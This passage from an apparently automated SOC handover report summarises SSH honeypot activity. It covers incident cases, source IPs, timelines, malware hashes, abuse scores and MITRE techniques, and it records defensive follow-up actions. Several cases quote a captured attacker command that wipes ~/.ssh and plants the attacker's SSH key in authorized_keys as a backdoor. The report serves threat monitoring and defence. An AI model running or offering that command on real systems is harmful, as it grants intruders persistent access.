| `2026-05-25 22:37:52` | `cowrie.session.connect` |
| `2026-05-25 22:37:52` | `cowrie.client.version` |
| `2026-05-25 22:37:52` | `cowrie.client.kex` |
| `2026-05-25 22:37:53` | `cowrie.login.success` |
| `2026-05-25 22:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.53[.]156` to AbuseIPDB if not already reported
- [ ] Block `120.48.53[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-358f2b449b77

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:38 |
| **Last Seen** | 2026-05-25 22:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:38:28` | `cowrie.session.connect` |
| `2026-05-25 22:38:28` | `cowrie.client.version` |
| `2026-05-25 22:38:29` | `cowrie.client.kex` |
| `2026-05-25 22:38:29` | `cowrie.login.success` |
| `2026-05-25 22:38:29` | `cowrie.session.params` |
| `2026-05-25 22:38:29` | `cowrie.command.input` |
| `2026-05-25 22:38:29` | `cowrie.command.failed` |
| `2026-05-25 22:38:29` | `cowrie.log.closed` |
| `2026-05-25 22:38:30` | `cowrie.session.params` |
| `2026-05-25 22:38:30` | `cowrie.command.input` |
| `2026-05-25 22:38:30` | `cowrie.session.file_download` |
| `2026-05-25 22:38:30` | `cowrie.log.closed` |
| `2026-05-25 22:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3cbef682060

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:38 |
| **Last Seen** | 2026-05-25 22:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:38:32` | `cowrie.session.connect` |
| `2026-05-25 22:38:32` | `cowrie.client.version` |
| `2026-05-25 22:38:32` | `cowrie.client.kex` |
| `2026-05-25 22:38:33` | `cowrie.login.success` |
| `2026-05-25 22:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4e8c188bbcf

| Field | Detail |
|---|---|
| **Source IP** | `120.48.53[.]156` |
| **First Seen** | 2026-05-25 22:38 |
| **Last Seen** | 2026-05-25 22:39 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:38:45` | `cowrie.session.connect` |
| `2026-05-25 22:38:45` | `cowrie.client.version` |
| `2026-05-25 22:38:46` | `cowrie.client.kex` |
| `2026-05-25 22:38:48` | `cowrie.login.success` |
| `2026-05-25 22:38:49` | `cowrie.session.params` |
| `2026-05-25 22:38:49` | `cowrie.command.input` |
| `2026-05-25 22:38:49` | `cowrie.command.failed` |
| `2026-05-25 22:38:50` | `cowrie.log.closed` |
| `2026-05-25 22:38:50` | `cowrie.session.params` |
| `2026-05-25 22:38:50` | `cowrie.command.input` |
| `2026-05-25 22:38:51` | `cowrie.session.file_download` |
| `2026-05-25 22:38:51` | `cowrie.log.closed` |
| `2026-05-25 22:39:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.53[.]156` to AbuseIPDB if not already reported
- [ ] Block `120.48.53[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2904ad44d557

| Field | Detail |
|---|---|
| **Source IP** | `120.48.53[.]156` |
| **First Seen** | 2026-05-25 22:39 |
| **Last Seen** | 2026-05-25 22:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:39:01` | `cowrie.session.connect` |
| `2026-05-25 22:39:01` | `cowrie.client.version` |
| `2026-05-25 22:39:01` | `cowrie.client.kex` |
| `2026-05-25 22:39:04` | `cowrie.login.success` |
| `2026-05-25 22:39:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.53[.]156` to AbuseIPDB if not already reported
- [ ] Block `120.48.53[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7d7b85b046b

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:39 |
| **Last Seen** | 2026-05-25 22:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:39:32` | `cowrie.session.connect` |
| `2026-05-25 22:39:32` | `cowrie.client.version` |
| `2026-05-25 22:39:32` | `cowrie.client.kex` |
| `2026-05-25 22:39:33` | `cowrie.login.success` |
| `2026-05-25 22:39:33` | `cowrie.session.params` |
| `2026-05-25 22:39:33` | `cowrie.command.input` |
| `2026-05-25 22:39:33` | `cowrie.command.failed` |
| `2026-05-25 22:39:33` | `cowrie.log.closed` |
| `2026-05-25 22:39:33` | `cowrie.session.params` |
| `2026-05-25 22:39:33` | `cowrie.command.input` |
| `2026-05-25 22:39:33` | `cowrie.session.file_download` |
| `2026-05-25 22:39:33` | `cowrie.log.closed` |
| `2026-05-25 22:39:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6625b0c58d92

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:39 |
| **Last Seen** | 2026-05-25 22:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:39:35` | `cowrie.session.connect` |
| `2026-05-25 22:39:35` | `cowrie.client.version` |
| `2026-05-25 22:39:35` | `cowrie.client.kex` |
| `2026-05-25 22:39:36` | `cowrie.login.success` |
| `2026-05-25 22:39:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b7bde278940

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:40 |
| **Last Seen** | 2026-05-25 22:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:40:24` | `cowrie.session.connect` |
| `2026-05-25 22:40:24` | `cowrie.client.version` |
| `2026-05-25 22:40:24` | `cowrie.client.kex` |
| `2026-05-25 22:40:25` | `cowrie.login.success` |
| `2026-05-25 22:40:25` | `cowrie.session.params` |
| `2026-05-25 22:40:25` | `cowrie.command.input` |
| `2026-05-25 22:40:25` | `cowrie.command.failed` |
| `2026-05-25 22:40:25` | `cowrie.log.closed` |
| `2026-05-25 22:40:25` | `cowrie.session.params` |
| `2026-05-25 22:40:25` | `cowrie.command.input` |
| `2026-05-25 22:40:26` | `cowrie.session.file_download` |
| `2026-05-25 22:40:26` | `cowrie.log.closed` |
| `2026-05-25 22:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68a1abf10943

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:40 |
| **Last Seen** | 2026-05-25 22:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:40:28` | `cowrie.session.connect` |
| `2026-05-25 22:40:28` | `cowrie.client.version` |
| `2026-05-25 22:40:29` | `cowrie.client.kex` |
| `2026-05-25 22:40:29` | `cowrie.login.success` |
| `2026-05-25 22:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caae607ff5b6

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:41 |
| **Last Seen** | 2026-05-25 22:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:41:29` | `cowrie.session.connect` |
| `2026-05-25 22:41:29` | `cowrie.client.version` |
| `2026-05-25 22:41:30` | `cowrie.client.kex` |
| `2026-05-25 22:41:30` | `cowrie.login.success` |
| `2026-05-25 22:41:30` | `cowrie.session.params` |
| `2026-05-25 22:41:30` | `cowrie.command.input` |
| `2026-05-25 22:41:30` | `cowrie.command.failed` |
| `2026-05-25 22:41:31` | `cowrie.log.closed` |
| `2026-05-25 22:41:31` | `cowrie.session.params` |
| `2026-05-25 22:41:31` | `cowrie.command.input` |
| `2026-05-25 22:41:31` | `cowrie.session.file_download` |
| `2026-05-25 22:41:31` | `cowrie.log.closed` |
| `2026-05-25 22:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce4ef2b1097c

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:41 |
| **Last Seen** | 2026-05-25 22:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:41:34` | `cowrie.session.connect` |
| `2026-05-25 22:41:34` | `cowrie.client.version` |
| `2026-05-25 22:41:34` | `cowrie.client.kex` |
| `2026-05-25 22:41:34` | `cowrie.login.success` |
| `2026-05-25 22:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.237.27[.]147` | **147** | 2026-05-25 21:56 | 2026-05-25 22:00 | 8m | 39 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.53[.]156` | **19** | 2026-05-25 22:18 | 2026-05-25 22:42 | 2m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `128.78.143[.]196` | **16** | 2026-05-25 22:03 | 2026-05-25 22:41 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.166.94[.]133` | **15** | 2026-05-25 21:58 | 2026-05-25 22:26 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **3** | 2026-05-25 21:41 | 2026-05-25 23:08 | 1m | 0 | `T1592` | 🟢 LOW |
| `118.186.7[.]9` | 1 | 2026-05-25 22:15 | 2026-05-25 22:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.123[.]76` | 1 | 2026-05-25 22:10 | 2026-05-25 22:10 | 2s | 0 | `T1592` | 🟢 LOW |
| `120.48.39[.]73` | 1 | 2026-05-25 22:04 | 2026-05-25 22:04 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.100.198[.]68` | 1 | 2026-05-25 22:08 | 2026-05-25 22:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]194` | 1 | 2026-05-25 21:48 | 2026-05-25 21:49 | 17s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]29` | 1 | 2026-05-25 22:55 | 2026-05-25 22:55 | 7s | 0 | `T1592` | 🟢 LOW |
| `95.161.198[.]2` | 1 | 2026-05-25 21:55 | 2026-05-25 21:55 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.48.53[.]156` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 1 |
| `172.237.27[.]147` | JP | Linode | **100** ⚠️ | 24 |
| `66.132.172[.]194` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `95.161.198[.]2` | KZ | OBIT-telecommunications, LLC | **100** ⚠️ | 0 |
| `128.78.143[.]196` | FR | Bouygues Telecom SA | **100** ⚠️ | 9 |
| `180.100.198[.]68` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 11 |
| `183.166.94[.]133` | CN | CHINANET Anhui province network | **100** ⚠️ | 36 |
| `71.6.232[.]29` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `120.48.123[.]76` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `118.186.7[.]9` | CN | Beijing xhxt technology development co., LTD | **100** ⚠️ | 14 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 132 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 72 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 53 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 27 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 27 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 266 cases |
| Tool 34  | Credential Extractor        | ✅ 134 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (2.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 53 priority case(s) shown individually · 12 recon entry/entries in table (5 group(s) consolidating 200 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-25T23:09:36Z_
